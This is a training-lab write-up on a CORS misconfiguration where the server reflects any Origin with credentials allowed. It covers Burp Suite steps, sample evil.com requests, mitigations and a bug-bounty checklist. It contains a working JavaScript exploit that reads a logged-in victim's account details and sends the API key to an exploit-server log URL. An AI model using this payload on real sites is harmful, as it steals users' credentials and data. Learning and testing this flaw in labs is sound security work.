# Lab 01 – CORS Vulnerability with Basic Origin Reflection

## Lab Information

**Difficulty:** Apprentice

**Category:** CORS

**Vulnerability:** Server reflects arbitrary Origin header

**Skills Learned**

- Identifying reflected origins
- Understanding ACAO
- Exploiting credentialed CORS
- Reading authenticated responses

---

# Lab Objective

Exploit a CORS configuration that reflects the supplied Origin header and allows credentials.

Use this vulnerability to obtain the administrator's API key.

---

# Background

The application performs the following logic:

```
Receive Origin

↓

Copy Origin

↓

Access-Control-Allow-Origin

↓

Access-Control-Allow-Credentials: true
```

Instead of validating trusted origins, every supplied origin is trusted.

---

# Vulnerability

Request

```http
GET /accountDetails HTTP/1.1

Origin: https://evil.com
```

Response

```http
HTTP/1.1 200 OK

Access-Control-Allow-Origin:
https://evil.com

Access-Control-Allow-Credentials: true
```

Because the victim is authenticated, the browser includes cookies and allows JavaScript running on `evil.com` to read the response.

---

# Burp Suite Workflow

### Step 1

Browse the application normally.

---

### Step 2

Intercept a request to:

```
/accountDetails
```

---

### Step 3

Send the request to **Repeater**.

---

### Step 4

Modify:

```http
Origin: https://evil.com
```

---

### Step 5

Observe:

```http
Access-Control-Allow-Origin:
https://evil.com
```

and

```http
Access-Control-Allow-Credentials: true
```

The application reflects arbitrary origins.

---

# Exploitation

Host the following JavaScript on the exploit server:

```javascript
<script>

var req = new XMLHttpRequest();

req.onload = function(){

location="https://exploit-server.net/log?key="+
encodeURIComponent(this.responseText);

};

req.open(
"GET",
"https://victim-site.net/accountDetails",
true
);

req.withCredentials=true;

req.send();

</script>
```

---

# Attack Flow

```
Victim Visits Exploit

↓

Browser Sends Cookies

↓

Server Reflects Origin

↓

Browser Allows Response

↓

API Key Stolen
```

---

# Impact

Possible consequences include:

- API key disclosure
- Personal data exposure
- Account information leakage
- Sensitive business data disclosure

---

# Mitigation

- Use a strict allowlist of trusted origins.
- Never reflect arbitrary Origin headers.
- Enable credentials only for trusted origins.

---

# Bug Bounty Methodology

Whenever you encounter CORS:

- Change the Origin header.
- Check ACAO.
- Check ACAC.
- Test authenticated endpoints.
- Verify whether JavaScript can read sensitive responses.

---

# Key Learnings

Reflection of arbitrary origins combined with credentialed requests is one of the most common and dangerous CORS vulnerabilities.